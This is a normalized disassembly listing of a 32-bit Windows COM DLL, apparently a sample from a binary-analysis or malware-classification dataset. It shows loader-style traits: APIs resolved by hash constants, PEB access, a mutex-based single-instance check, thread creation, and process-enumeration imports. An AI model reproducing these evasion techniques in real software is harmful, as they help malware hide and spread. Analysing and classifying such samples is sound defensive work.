add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
sub_100078b8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push 0x4
push esi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
and [ esi ] 0x0
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax 0x80004003
jmp r-xdata
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
push esi
push [ ebp + 0xc ]
push eax
call [ ecx ]
mov eax 0x80004005
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_100078f7
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
js r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push edi
lea edi [ esi + 0x14 ]
push edi
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jns r-xdata
mov eax [ edi ]
mov ecx [ eax ]
add esi 0x18
push esi
push rw-data
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
pop edi
sub_10007950
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push [ esi + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ esi + 0x14 ]
and [ esi + 0x18 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x14 ] 0x0
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x10 ] 0x0
sub_100079ad
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push 0x4
push ebx
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebx ] edi
cmp [ esi + 0xc ] edi
jle r-xdata
mov eax 0x80004003
jmp r-xdata
mov eax 0x80004002
mov [ ebp + 0x10 ] edi
pop ebx
pop ebp
retn 0xc
mov [ ebx ] esi
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
xor eax eax
jmp r-xdata
add [ ebp + 0x10 ] 0x10
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_100077bc
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_10007a10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4 ]
push eax
call [ InterlockedDecrement@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x14 ]
sub_10007a3d
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007987
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100049b2
pop ecx
sub_10007a5c
push r--data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
retn
push esi
push 0x2d
call sub_10004992
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_100050a1
mov esi eax
jmp r-xdata
mov ecx esi
call sub_1000675f
init
push ebp
mov ebp esp
sub esp 0x24
push 0x4
call sub_10004992
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10001000
jmp r-xdata
push edi
push edi
push edi
lea eax [ ebp - 0x24 ]
push eax
call esi
test eax eax
jne r-xdata
push ebx
push esi
mov esi [ GetLastError@IAT ]
mov [ rw-data ] eax
mov eax [ eax ]
push edi
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
lea eax [ ebp - 0x8 ]
push eax
xor eax eax
push eax
push eax
push sub_10007a5c
push eax
push eax
call [ CreateThread@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
mov esi [ GetMessageA@IAT ]
xor edi edi
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call [ DispatchMessageA@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
sub_10007b60
push ebp
mov ebp esp
sub esp 0x5c
push 0x10
push r--data
push [ ebp + 0x10 ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
push esi
push edi
push 0x5
lea esi [ ebp - 0x5c ]
pop edi
mov eax 0x80020001
jmp r-xdata
push esi
call [ VariantInit@IAT ]
add esi 0x10
dec edi
jne r-xdata
cmp [ ebp + 0xc ] 0xfa
jne r-xdata
leave
retn 0x24
push 0x5
lea esi [ ebp - 0x5c ]
pop edi
mov edi [ ebp + 0x1c ]
mov eax [ edi ]
mov esi [ VariantChangeType@IAT ]
push ebx
push 0x8
xor ebx ebx
push ebx
add eax 0x50
push eax
lea eax [ ebp - 0x5c ]
push eax
call esi
mov eax [ edi ]
push 0x3
push ebx
add eax 0x40
push eax
lea eax [ ebp - 0x4c ]
push eax
call esi
mov eax [ edi ]
push 0x8
push ebx
add eax 0x30
push eax
lea eax [ ebp - 0x3c ]
push eax
call esi
mov eax [ edi ]
push 0x2011
push ebx
add eax 0x20
push eax
lea eax [ ebp - 0x2c ]
push eax
call esi
mov eax [ edi ]
push 0x8
push ebx
add eax 0x10
push eax
lea eax [ ebp - 0x1c ]
push eax
call esi
cmp [ ebp - 0x2c ] bx
je r-xdata
push esi
call [ VariantClear@IAT ]
add esi 0x10
dec edi
jne r-xdata
pop edi
xor eax eax
pop esi
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp - 0x24 ]
call [ SafeArrayGetLBound@IAT ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x24 ]
call [ SafeArrayGetUBound@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x24 ]
call [ SafeArrayAccessData@IAT ]
jmp r-xdata
mov eax [ edi ]
cmp [ ebp + 0x13 ] bl
mov eax [ eax + 0x8 ]
pop ebx
je r-xdata
push [ ebp - 0x24 ]
call [ SafeArrayUnaccessData@IAT ]
mov eax [ edi ]
mov eax [ eax + 0x8 ]
cmp [ eax ] bx
setne [ ebp + 0x13 ]
cmp [ ebp - 0x2c ] bx
je r-xdata
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
mov [ eax ] cx
sub_10007c97
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_10007950
test esi esi
jne r-xdata
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov eax [ esi ]
push ebx
lea ecx [ edi + 0x10 ]
push ecx
push r--data
push esi
call [ eax ]
mov ebx eax
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
test ebx ebx
jns r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
call sub_100078f7
xor eax eax
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
pop ebx
sub_10007cea
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
push rw-data
mov [ esi + 0x4 ] 0x0
call [ InterlockedIncrement@IAT ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10007d34
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10007987
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100049b2
pop ecx
sub_10007d59
push esi
push 0x2
push rw-data
mov esi ecx
call sub_10007cea
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10007d7d
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007c81
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100049b2
pop ecx
DllGetClassObject
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x4
call sub_10004992
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov [ rw-data ] ebx
mov ecx eax
call sub_10001000
mov [ rw-data ] eax
jmp r-xdata
mov edi [ ebp + 0x10 ]
push 0x4
push edi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x3
mov edi r--data
push edi
call [ eax ]
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
push 0x10
mov [ edi ] ebx
call sub_10004992
pop ecx
cmp eax ebx
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor ebx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4
push edi
call [ eax ]
mov eax 0x80040111
jmp r-xdata
xor esi esi
mov ecx eax
call sub_10007d1b
mov esi eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ esi ]
push edi
push [ ebp + 0xc ]
push esi
call [ eax ]
test eax eax
jns r-xdata
mov eax 0x8007000e
jmp r-xdata
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push sub_10007a5c
push ebx
push ebx
call [ CreateThread@IAT ]
xor eax eax
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x14 ]
sub_10007eb6
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push edi
mov edi [ ebp + 0x14 ]
push 0x4
push edi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax 0x80040110
jmp r-xdata
and [ edi ] 0x0
push esi
push 0x1c
call sub_10004992
pop ecx
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x10
xor esi esi
mov ecx eax
call sub_10007d59
mov esi eax
jmp r-xdata
pop edi
mov eax [ esi ]
push edi
push [ ebp + 0x10 ]
push esi
call [ eax ]
mov edi eax
test edi edi
jns r-xdata
mov eax 0x8007000e
jmp r-xdata
test esi esi
jne r-xdata
mov eax edi
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x14 ]
pop esi
sub_10007f38
push esi
push edi
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
retn
sub_10001000
mov eax ecx
mov [ eax ] r--data
retn
sub_10001009
retn 0x14
sub_10001558
mov eax [ fs : 0x30 ]
retn
sub_1000159c
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
push 0x4b1ffe8e
call sub_1000155f
pop ecx
mov [ rw-data ] eax
sub_10001634
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea edx [ ecx - 0x1 ]
xor eax eax
cmp edx 0x239
ja r-xdata
pop ebp
retn
mov eax [ ecx * 4 + rw-data ]
sub_10001876
push ebp
mov ebp esp
push 0x2b
push 0xa48d6762
push 0x1
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001cfe
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
pop ebp
jmp sub_10001cb3
xor al al
pop ebp
retn
sub_10002008
push ebp
mov ebp esp
pop ebp
jmp sub_10001f78
sub_10002d64
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov [ esi ] r--data
pop esi
retn
push eax
call sub_10001f78
pop ecx
sub_10002f8d
call sub_10001558
mov eax [ eax + 0x1d4 ]
retn
sub_10002f99
mov eax r--data
retn
sub_1000306d
push 0x6d
push 0x69260152
push 0x1
push 0x0
call sub_10001844
add esp 0x10
jmp eax
sub_100030a5
push ebp
mov ebp esp
push 0x23
push 0x81f0f0df
push 0x1
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100041fe
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_100041b0
cmp [ ebp + 0x8 ] ax
sete al
pop ebp
retn 0xc
DllUnregisterServer
xor eax eax
retn
sub_10004392
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_1000439f
mov [ ecx + 0x10 ] 0x1
retn
sub_1000442a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
pop ebp
retn 0x4
sub_10004437
mov [ ecx + 0x11 ] 0x1
retn
sub_10004711
push [ ecx ]
call sub_100049d3
pop ecx
retn
sub_100047fb
push esi
mov esi ecx
call sub_100047b3
mov eax esi
pop esi
retn
sub_10005052
mov eax [ ecx + 0x4 ]
retn
sub_10005056
mov eax [ ecx + 0x8 ]
retn
sub_1000505a
mov eax [ ecx + 0xc ]
retn
sub_10007059
mov ecx [ ecx + 0x4 ]
jmp sub_10005052
sub_100077bc
push ebp
mov ebp esp
push 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100042b0
add esp 0xc
neg eax
sbb eax eax
inc eax
pop ebp
retn
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov [ rw-data ] eax
call [ DisableThreadLibraryCalls@IAT ]
DllCanUnloadNow
mov eax [ rw-data ]
xor ecx ecx
test eax eax
setg cl
mov eax ecx
retn
sub_10007804
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push rw-data
je r-xdata
call [ InterlockedDecrement@IAT ]
call [ InterlockedIncrement@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn 0x8
sub_1000789a
xor eax eax
inc eax
retn 0x4
sub_100078a0
mov eax 0x80004001
retn 0x8
sub_100078a8
mov eax 0x80004001
retn 0x10
sub_100078b0
mov eax 0x80004001
retn 0x18
sub_10007987
push rw-data
mov [ ecx ] r--data
call [ InterlockedDecrement@IAT ]
retn
sub_10007999
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call [ InterlockedIncrement@IAT ]
pop ebp
retn 0x4
sub_10007c81
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10007950
mov ecx esi
pop esi
jmp sub_10007987
sub_10007d1b
push esi
push 0x2
push rw-data
mov esi ecx
call sub_10007cea
mov [ esi ] r--data
mov eax esi
pop esi
retn
ObtainUserAgentString
jmp [ ObtainUserAgentString@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
